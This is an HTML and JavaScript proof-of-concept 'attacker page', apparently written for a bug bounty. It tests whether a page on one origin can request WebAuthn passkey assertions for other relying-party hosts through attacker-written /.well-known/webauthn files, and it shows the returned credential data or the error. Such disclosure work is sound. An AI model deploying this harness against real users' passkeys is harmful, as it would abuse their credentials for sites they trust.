<title>Attacker page</title>
<h2>Attacker page</h2>
<p>This page's origin: <b><span id="org"></span></b></p>

<p>Relying party hosts to request. Each serves a <code>/.well-known/webauthn</code> written by the
attacker.</p>
<p>Case A host: <input id="rpno" size="46"></p>
<p>Case B host: <input id="rpyes" size="46"></p>

<p>
<button onclick="go('rpno')">Case A: origins name no site you hold a passkey for</button>
<button onclick="go('rpyes')">Case B: origins name sites you do hold passkeys for</button>
</p>
<pre id="out"></pre>

<script>
// CONFIG: defaults for the hosted copy. Edit these two if you deploy the package yourself.
document.getElementById('rpno').value  = "testorg-1-bugbounty.github.io";
document.getElementById('rpyes').value = "evil-testorg-1-bugbounty.github.io";
document.getElementById('org').textContent = location.origin;
function hex(b){return [...new Uint8Array(b)].map(x=>x.toString(16).padStart(2,'0')).join('');}
async function go(which){
  const out=document.getElementById('out');
  const rpId=document.getElementById(which).value.trim();
  if(!rpId){ out.textContent='enter a host first'; return; }
  out.textContent='requesting rpId='+rpId+' ...';
  const t0=performance.now();
  try{
    const c=await navigator.credentials.get({publicKey:{
      challenge: crypto.getRandomValues(new Uint8Array(32)),
      rpId: rpId,
      userVerification: "discouraged"
    }});
    out.textContent=
      'elapsed_ms: '+Math.round(performance.now()-t0)+
      '\npage_origin: '+location.origin+
      '\nrequested_rpId: '+rpId+
      '\ncredentialId: '+c.id+
      '\nuserHandle: '+new TextDecoder().decode(c.response.userHandle)+
      '\nsignature_bytes: '+new Uint8Array(c.response.signature).length+
      '\nrpIdHash_hex: '+hex(c.response.authenticatorData.slice(0,32))+
      '\nclientDataJSON: '+new TextDecoder().decode(c.response.clientDataJSON);
  }catch(e){
    out.textContent=
      'elapsed_ms: '+Math.round(performance.now()-t0)+
      '\npage_origin: '+location.origin+
      '\nrequested_rpId: '+rpId+
      '\nrejected_name: '+e.name+
      '\nrejected_message: '+e.message;
  }
}
</script>
